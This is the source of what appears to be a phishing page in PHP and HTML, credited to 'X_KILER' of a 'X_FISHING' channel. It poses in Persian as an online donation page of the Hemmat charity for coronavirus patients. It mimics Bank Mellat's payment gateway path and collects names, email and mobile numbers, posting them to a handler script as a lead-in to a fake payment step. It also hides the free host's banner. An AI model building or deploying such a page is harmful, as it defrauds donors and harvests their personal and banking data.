
<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<title>کمک آنلاین خیریه همت</title>
	
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
    <script language="javascript" type="text/javascript">    
		function postRefId (refIdValue) {
			var form = document.createElement("form");
			form.setAttribute("method", "POST");
			form.setAttribute("action", "../../https@pgw.bpm.bankmellat.ir/pgwchannel/startpay.mellat");         
			form.setAttribute("target", "_self");
			var hiddenField = document.createElement("input");              
			hiddenField.setAttribute("name", "RefId");
			hiddenField.setAttribute("value", refIdValue);
			form.appendChild(hiddenField);

			document.body.appendChild(form);         
			form.submit();
			document.body.removeChild(form);
		}
		
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
	</script>
    <script>
        $(function() {
            $("li#pa").click(function(e) {
              e.preventDefault();
              $("li#me").removeClass("selected");
              $("li#h").removeClass("selected");
              $(this).addClass("selected");
              $('#ajax-contact-form').attr('Action', 'pa2.php');
            });
            $("li#me").click(function(e) {
              e.preventDefault();
              $("li#pa").removeClass("selected");
              $("li#h").removeClass("selected");
              $(this).addClass("selected");
              $('#ajax-contact-form').attr('Action', 'me.php');
            });
             $("li#h").click(function(e) {
                 e.preventDefault();
                 $("li#pa").removeClass("selected");
                 $("li#me").removeClass("selected");
                 $(this).addClass("selected");
                 $('#ajax-contact-form').attr('Action', 'h.php');
             });

            $('#PayAmount').keyup(function () {
                if ($.trim(this.value) == "") {
                  $('#PayRequestButton').attr("disabled", "disabled");
                }
              else {
                    $('#PayRequestButton').removeAttr("disabled");
              }
            });    
        });

    </script>
    <script type='text/javascript' src='main1.js'></script>

	<script> (function(d, t) { var g = d.createElement(t), s  = d.getElementsByTagName(t)[0]; g.async = true; g.src =  'https://apis.google.com/js/plusone.js'; s.parentNode.insertBefore(g,  s); })(document, 'script'); </script>


<style type="text/css">

/*
CODED BY XKILER
*/

/************************************** font */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
  color: #32CD32;
  opacity: 1; /* Firefox */
}

:-ms-input-placeholder { /* Internet Explorer 10-11 */
  color: #32CD32;
}

::-ms-input-placeholder { /* Microsoft Edge */
  color: #32CD32;
}
@font-face {
	font-family: 'hemmat';
	src: url('font/BMitra.eot');
	src: local('hemmat'),
	local('hemmat'),
	url('font/BMitra.woff') format('woff'),
	url('font/BMitra.ttf') format('truetype'),
	url('font/BMitra.svg#webfonta05IB17H') format('svg');
}

/************************************** body */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
*{
	padding:0px;
	margin:0px;
}
body {
	margin:0px;
	padding:0px;
	background-image: url(images/bg.gif);
	background-repeat: repeat;
}
ol,ul,li,abbr{
	list-style:none;
}
.clear{
	clear:both;
}
p{
	line-height:1.5em;
	padding-bottom:5px;
	font-family:Tahoma, Arial, Helvetica, sans-serif;
	font-size:12px;
}
image,img{
	border:0px;
}
label{
	text-align:right;
	direction:rtl;
}
table{
	width:80%;
	height:auto;
	margin:15px;
	direction:ltr;
}
td{
	padding:10px;
	text-align:right;
	direction:rtl;
}

/************************************** link style */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
body,td,th {
	font-family:Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 12px;
	color:#000000;
	text-align: right;
}
a {
	color:#FF3300;
	text-decoration: none;
}
a:link {
	color: #FF3300;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	color: #FF3300;
	text-decoration: none;
}
a:active {
	text-decoration: none;
}
form,input{
	padding:0px;
	margin:0px;
}
h4,h5,h6,form{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 24px;
	font-weight:normal;
	direction:rtl;
	color: #77c14a;
}
h1{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 28px;
	font-weight:normal;
	text-align:center;
	direction:rtl;
	color: #FF3300;
	margin-top:10px;
	/*text-shadow: 0px 1px 1px #000000;*/
}
h2{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 18px;
	font-weight:normal;
	text-align:center;
	direction:rtl;
	color: #000000;
	margin-bottom:10px;
}
h3{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 30px;
	font-weight:normal;
	text-align:center;
	direction:rtl;
	color: #000000;
}
h4{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 18px;
	font-weight:normal;
	text-align:center;
	direction:rtl;
	color: #FF3300;
	margin-top:10px;
	/*text-shadow: 0px 1px 1px #000000;*/
}

/************************************** full */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.warp{
    width:100%;
    height:116px;
    position:absolute;
    left:0;
    right:0;
    top:0;
    z-index:-100;
    background-image: url(images/header-top.gif);
    background-repeat: repeat-x;
    background-position: top;
}
.logo{
    width:100%;
    height:238px;
    margin:0 auto 20px;
    background-image:url(images/logo-payment.png);
    background-repeat: no-repeat;
    background-position: center top;
}
.hemmat_{
    width:80%;
    max-width:500px;
    margin:20px auto 0;
}
.note_{
    margin-bottom:10px;
}
.box{
    width:100%;
    height:auto;
    padding:10px 0px;
    margin:auto;
    
    border:1px solid #000000;

    -webkit-box-shadow: 0px 0px 5px rgba(0, 50, 50, 0.35);
    -moz-box-shadow:    0px 0px 5px rgba(0, 50, 50, 0.35);
    box-shadow:         0px 0px 5px rgba(0, 50, 50, 0.35);

    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    background-color: #FFFFFF;
}
.box p{
    text-align:right;
    direction:rtl;
    width:80%;
    margin-right:20%;
}
.footer{
    margin-bottom:20px;
    text-align:center;
}

/************************************** bank */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.banks {
    text-align: center;
    list-style: none;
    margin: 10px 0 0;
    padding: 0;
    overflow: hidden;
    position: relative;
}
.banks li {
    display: inline-block;
    position:relative;
    background-color:#FFFFFF;
    padding:5px;
}
.banks li.selected {
    background-color:#FF3300;
	
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
}

/************************************** form */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.n-s{
	width:90%;
	padding-right:5%;
	padding-left:5%;
	margin:auto;
	height:40px;
	background-color:#FFFFFF;
	font-family:Tahoma, Arial, Helvetica, sans-serif;
	font-size:12px;
	float:left;
	border-bottom-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: dotted;

	border-left-style: none;
	border-bottom-color: #000000;
}
.n-s-error{
	width:90%;
	padding-right:5%;
	padding-left:5%;
	margin:auto;
	height:40px;
	background-color:#FFB3B5;
	font-family:Tahoma, Arial, Helvetica, sans-serif;
	font-size:12px;
	float:left;
	border-bottom-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: dotted;

	border-left-style: none;
	border-bottom-color: #FF0000;
}

.button {
	margin-top:20px;
    display: inline-block;
    background: #ffc835;
    -webkit-box-shadow: 0px 1px 0px 0px #ffd564 inset, 0px 0px 0px 4px #e6e6e6;
    -moz-box-shadow: 0px 1px 0px 0px #ffd564 inset, 0px 0px 0px 4px #e6e6e6;
    box-shadow: 0px 1px 0px 0px #ffd564 inset, 0px 0px 0px 4px #e6e6e6;
    -webkit-border-radius: 2px;
    -moz-border-radius: 2px;
    border-radius: 2px;
    -webkit-transition: all 0.2s ease-in-out;
    -moz-transition: all 0.2s ease-in-out;
    -o-transition: all 0.2s ease-in-out;
    transition: all 0.2s ease-in-out;
    text-shadow: 0px 1px 0px #ffe6a5;
    padding: 6px 30px;
    border-color: #ebae3e;
    border-width: 1px;
    border-style: solid;
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 26px;
	direction:rtl;
    color: #4f2f2f;
}
.button:hover {
    background: #ffd200;
    -webkit-box-shadow: 0px 1px 0px 0px #ffe04f inset, 0px 0px 0px 4px #ffed99;
    -moz-box-shadow: 0px 1px 0px 0px #ffe04f inset, 0px 0px 0px 4px #ffed99;
    box-shadow: 0px 1px 0px 0px #ffe04f inset, 0px 0px 0px 4px #ffed99;
    border-color: #ffc835;
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
</style>

</head>
<body>

    <div class="warp"></div>
    <div class="hemmat_">
    <a href="#"><div class="logo"></div></a>
    <div class="note_">
        <h1>کمک آنلاین به بیماران کرونایی</h1>
    </div>
    <div class="box">
		<h1>فرم زیر را تکمیل نمایید</h1>
		
    <form id="ajax-contact-form" name="form1" method="post" preservedata="true" Action="pa2.php?P=<?php echo $P?>&e=<?php echo $e?>" >
        <input class="n-s" type="text" required="required" name="name" placeholder="نام :"
        onfocus="if(this.value==this.defaultValue)this.value='';" onblur="if(this.value=='')this.value=this.defaultValue;" />
        <br />
        <input class="n-s" type="text" required="required" name="lastname" placeholder="نام خانوادگی :"
        onfocus="if(this.value==this.defaultValue)this.value='';" onblur="if(this.value=='')this.value=this.defaultValue;" />
        <br />
        <input class="n-s" type="text"  name="email" placeholder="پست الکترونیک (اختیاری) :"
        onfocus="if(this.value==this.defaultValue)this.value='';" onblur="if(this.value=='')this.value=this.defaultValue;" />
        <br />
        <input class="n-s" type="text" required="required" autocomplete="off" name="PayAdditionalData" placeholder="توضیحات :"
        onfocus="if(this.value==this.defaultValue)this.value='';" onblur="if(this.value=='')this.value=this.defaultValue;" />
        <br />
        <input id="mobile" class="n-s" type="text" autocomplete="off" maxlength="11" required="required" name="mobile" placeholder="شماره تلفن همراه :"/>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
        <br  style="clear:both;">
            <div class="clear"></div>
        <div class="clear"></div>
        <div align="center">
            <input id ="PayRequestButton" class="button" type="submit" name="PayRequestButton" value="ارسال" />
        </div>
    </form>
    </div>  
    <div class="clear"></div>
	
    <div align="center">
		<br />
      
      <br />
    </div>
    <div class="footer">
        کمک آنلاین بوسیله تمام کارت های عضو شتاب |
        <a href="#">خیریه همت</a>
     </div>
    </div>
	
</body>
</html>
<!--***************Created By: X_KILER ***************-->
<!--***************Channel:@X_FISHING***************-->
<html>  
<head>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <meta charset="utf-8">
  <title></title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">